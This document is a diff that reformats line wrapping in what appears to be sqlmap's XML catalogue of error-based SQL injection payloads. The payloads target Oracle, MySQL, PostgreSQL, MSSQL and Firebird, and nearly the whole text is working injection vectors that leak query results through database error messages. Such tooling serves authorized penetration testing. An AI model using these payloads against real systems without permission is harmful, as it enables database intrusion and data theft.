-        <vector>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <vector>OR [RANDNUM]=(SELECT
+            UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),'
+            ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
+        </vector>
         <request>
-            <payload>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
+            <payload>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN
+                ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -560,7 +644,9 @@
         <where>1</where>
         <vector>AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')</payload>
+            <payload>AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN
+                ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -580,7 +666,9 @@
         <where>2</where>
         <vector>OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')</payload>
+            <payload>OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN
+                ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -600,7 +688,9 @@
         <where>1</where>
         <vector>AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],'[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))</payload>
+            <payload>AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN
+                ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -619,7 +709,9 @@
         <where>2</where>
         <vector>OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],'[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))</payload>
+            <payload>OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN
+                ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -638,7 +730,9 @@
         <where>1</where>
         <vector>AND [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>AND [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))</payload>
+            <payload>AND [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN
+                ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -657,7 +751,9 @@
         <where>2</where>
         <vector>OR [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>OR [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))</payload>
+            <payload>OR [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN
+                ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -676,7 +772,9 @@
         <where>1</where>
         <vector>AND [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')</payload>
+            <payload>AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM
+                RDB$DATABASE)||'[DELIMITER_STOP]')
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -695,7 +793,9 @@
         <where>2</where>
         <vector>OR [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')</payload>
+            <payload>OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM
+                RDB$DATABASE)||'[DELIMITER_STOP]')
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -718,9 +818,13 @@
         <risk>1</risk>
         <clause>1,2,3,4,5</clause>
         <where>1</where>
-        <vector>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')),1)</vector>
+        <vector>PROCEDURE
+            ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')),1)
+        </vector>
         <request>
-            <payload>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')),1)</payload>
+            <payload>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN
+                ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')),1)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -740,13 +844,17 @@
         <risk>1</risk>
         <clause>1,2,3,9</clause>
         <where>3</where>
-        <vector>(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
+        <vector>(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s),
+            8446744073709551610, 8446744073709551610)))
+        </vector>
         <request>
             <!-- These work as good as ELT(), but are longer
             <payload>(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
             <payload>(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
             -->
-            <payload>(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+            <payload>(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -766,7 +874,9 @@
         <where>3</where>
         <vector>EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
         <request>
-            <payload>EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))</payload>
+            <payload>EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -784,9 +894,13 @@
         <risk>1</risk>
         <clause>1,2,3,9</clause>
         <where>3</where>
-        <vector>JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))</vector>
+        <vector>JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING
+            utf8)))
+        </vector>
         <request>
-            <payload>JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))</payload>
+            <payload>JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -804,13 +918,19 @@
         <risk>1</risk>
         <clause>1,2,3,9</clause>
         <where>3</where>
-        <vector>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</vector>
+        <vector>(SELECT [RANDNUM] FROM(SELECT
+            COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM
+            INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+        </vector>
         <request>
             <!-- These work as good as ELT(), but are longer
             <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
             <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
             -->
-            <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
+            <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS
+                GROUP BY x)a)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -834,7 +954,9 @@
             <payload>(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1]))</payload>
             <payload>(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1]))</payload>
             -->
-            <payload>(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1]))</payload>
+            <payload>(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1]))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -858,7 +980,9 @@
             <payload>(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')))</payload>
             <payload>(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')))</payload>
             -->
-            <payload>(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')))</payload>
+            <payload>(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -878,7 +1002,9 @@
         <where>3</where>
         <vector>(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))</vector>
         <request>
-            <payload>(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))</payload>
+            <payload>(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0
+                END))::text||'[DELIMITER_STOP]' AS NUMERIC))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -897,7 +1023,9 @@
         <where>3</where>
         <vector>(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))</vector>
         <request>
-            <payload>(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))</payload>
+            <payload>(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN
+                ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -916,7 +1044,9 @@
         <where>3</where>
         <vector>(CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))</vector>
         <request>
-            <payload>(CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))</payload>
+            <payload>(CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0'
+                END))+'[DELIMITER_STOP]')))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -937,7 +1067,9 @@
         <where>3</where>
         <vector>(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')</payload>
+            <payload>(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0'
+                END))+'[DELIMITER_STOP]')
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -956,9 +1088,13 @@
         <risk>1</risk>
         <clause>1,3</clause>
         <where>3</where>
-        <vector>(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <vector>(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),'
+            ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
+        </vector>
         <request>
-            <payload>(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
+            <payload>(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN
+                ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -977,7 +1113,9 @@
         <where>3</where>
         <vector>(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))</vector>
         <request>
-            <payload>(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))</payload>
+            <payload>(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END
+                FROM RDB$DATABASE)||'[DELIMITER_STOP]'))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -996,9 +1134,14 @@
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)</vector>
+        <vector>,(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT
+            CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610,
+            8446744073709551610)))x)
+        </vector>
         <request>
-            <payload>,(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)</payload>
+            <payload>,(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1016,9 +1159,13 @@
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x)))s)</vector>
+        <vector>,(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT
+            CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x)))s)
+        </vector>
         <request>
-            <payload>,(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x)))s)</payload>
+            <payload>,(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x)))s)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1036,9 +1183,13 @@
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8))))x)</vector>
+        <vector>,(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT
+            CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8))))x)
+        </vector>
         <request>
-            <payload>,(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8))))x)</payload>
+            <payload>,(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT
+                CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8))))x)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1056,9 +1207,15 @@
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,(SELECT 1 FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</vector>
+        <vector>,(SELECT 1 FROM(SELECT
+            COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM
+            INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+        </vector>
         <request>
-            <payload>,(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
+            <payload>,(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS
+                GROUP BY x)a)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1078,7 +1235,9 @@
         <where>1</where>
         <vector>,EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
         <request>
-            <payload>,EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+            <payload>,EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1098,7 +1257,9 @@
         <where>1</where>
         <vector>,UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])</vector>
         <request>
-            <payload>,UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
+            <payload>,UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1116,9 +1277,16 @@
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)</vector>
+        <vector>,(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT
+            COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2]
+            UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)
+        </vector>
         <request>
-            <payload>,(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)</payload>
+            <payload>,(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT
+                COUNT(*),CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT
+                [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1139,7 +1307,9 @@
